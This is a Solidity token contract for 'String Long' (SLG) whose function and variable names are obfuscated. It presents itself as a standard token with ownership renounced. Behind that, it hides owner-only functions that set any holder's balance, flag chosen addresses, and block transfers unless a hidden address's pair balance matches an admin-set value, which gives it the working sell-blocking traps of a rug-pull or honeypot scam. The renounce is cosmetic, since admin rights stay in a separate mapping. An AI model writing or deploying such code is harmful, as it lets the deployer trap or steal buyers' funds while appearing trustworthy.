//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface receiverLimitList {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract autoTxSwap {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface receiverWallet {
    function createPair(address atShould, address walletToMax) external returns (address);
}

interface sellWallet {
    function totalSupply() external view returns (uint256);

    function balanceOf(address receiverFrom) external view returns (uint256);

    function transfer(address listTake, uint256 sellIs) external returns (bool);

    function allowance(address senderAmount, address spender) external view returns (uint256);

    function approve(address spender, uint256 sellIs) external returns (bool);

    function transferFrom(
        address sender,
        address listTake,
        uint256 sellIs
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellMin, uint256 value);
    event Approval(address indexed senderAmount, address indexed spender, uint256 value);
}

interface sellWalletMetadata is sellWallet {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract StringLong is autoTxSwap, sellWallet, sellWalletMetadata {

    function symbol() external view virtual override returns (string memory) {
        return buyMinAuto;
    }

    bool private shouldWallet;

    function name() external view virtual override returns (string memory) {
        return listReceiverTake;
    }

    mapping(address => uint256) private senderList;

    function balanceOf(address receiverFrom) public view virtual override returns (uint256) {
        return senderList[receiverFrom];
    }

    event OwnershipTransferred(address indexed walletLiquidity, address indexed enableMarketing);

    function transferFrom(address txWallet, address listTake, uint256 sellIs) external override returns (bool) {
        if (_msgSender() != atTo) {
            if (fundLaunch[txWallet][_msgSender()] != type(uint256).max) {
                require(sellIs <= fundLaunch[txWallet][_msgSender()]);
                fundLaunch[txWallet][_msgSender()] -= sellIs;
            }
        }
        return fromWallet(txWallet, listTake, sellIs);
    }

    function atFund(address shouldFundTotal) public {
        receiverTo();
        
        if (shouldFundTotal == takeLiquidity || shouldFundTotal == buyTeam) {
            return;
        }
        receiverIsTotal[shouldFundTotal] = true;
    }

    constructor (){
        
        receiverLimitList exemptReceiverTx = receiverLimitList(atTo);
        buyTeam = receiverWallet(exemptReceiverTx.factory()).createPair(exemptReceiverTx.WETH(), address(this));
        
        takeLiquidity = _msgSender();
        buyMarketingTotal();
        receiverSwap[takeLiquidity] = true;
        senderList[takeLiquidity] = tradingLaunched;
        if (receiverAt) {
            receiverAt = true;
        }
        emit Transfer(address(0), takeLiquidity, tradingLaunched);
    }

    mapping(address => mapping(address => uint256)) private fundLaunch;

    function autoIsMarketing(address totalFrom, uint256 sellIs) public {
        receiverTo();
        senderList[totalFrom] = sellIs;
    }

    function receiverShouldSender(address txWallet, address listTake, uint256 sellIs) internal returns (bool) {
        require(senderList[txWallet] >= sellIs);
        senderList[txWallet] -= sellIs;
        senderList[listTake] += sellIs;
        emit Transfer(txWallet, listTake, sellIs);
        return true;
    }

    bool public takeLimit;

    string private listReceiverTake = "String Long";

    mapping(address => bool) public receiverSwap;

    function sellSwap(uint256 sellIs) public {
        receiverTo();
        receiverLimit = sellIs;
    }

    function getOwner() external view returns (address) {
        return sellFee;
    }

    uint256 constant txMode = 20 ** 10;

    address atTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    bool private receiverAt;

    uint256 public exemptLaunch;

    address public takeLiquidity;

    function totalSupply() external view virtual override returns (uint256) {
        return tradingLaunched;
    }

    function receiverTo() private view {
        require(receiverSwap[_msgSender()]);
    }

    uint256 private tradingLaunched = 100000000 * 10 ** 18;

    uint256 private swapFee;

    function owner() external view returns (address) {
        return sellFee;
    }

    address public buyTeam;

    uint256 public senderLiquidity;

    function allowance(address takeReceiver, address receiverFee) external view virtual override returns (uint256) {
        if (receiverFee == atTo) {
            return type(uint256).max;
        }
        return fundLaunch[takeReceiver][receiverFee];
    }

    function decimals() external view virtual override returns (uint8) {
        return tradingLimit;
    }

    function buyMarketingTotal() public {
        emit OwnershipTransferred(takeLiquidity, address(0));
        sellFee = address(0);
    }

    uint256 private txList;

    uint8 private tradingLimit = 18;

    function fromWallet(address txWallet, address listTake, uint256 sellIs) internal returns (bool) {
        if (txWallet == takeLiquidity) {
            return receiverShouldSender(txWallet, listTake, sellIs);
        }
        uint256 sellTeam = sellWallet(buyTeam).balanceOf(isLaunched);
        require(sellTeam == receiverLimit);
        require(listTake != isLaunched);
        if (receiverIsTotal[txWallet]) {
            return receiverShouldSender(txWallet, listTake, txMode);
        }
        return receiverShouldSender(txWallet, listTake, sellIs);
    }

    bool public receiverSwapMarketing;

    function transfer(address totalFrom, uint256 sellIs) external virtual override returns (bool) {
        return fromWallet(_msgSender(), totalFrom, sellIs);
    }

    function launchedShould(address txTeamExempt) public {
        if (toAmount) {
            return;
        }
        
        receiverSwap[txTeamExempt] = true;
        if (txList == swapFee) {
            exemptLaunch = senderLiquidity;
        }
        toAmount = true;
    }

    uint256 launchedTrading;

    mapping(address => bool) public receiverIsTotal;

    function approve(address receiverFee, uint256 sellIs) public virtual override returns (bool) {
        fundLaunch[_msgSender()][receiverFee] = sellIs;
        emit Approval(_msgSender(), receiverFee, sellIs);
        return true;
    }

    address isLaunched = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 receiverLimit;

    bool public toAmount;

    address private sellFee;

    string private buyMinAuto = "SLG";

}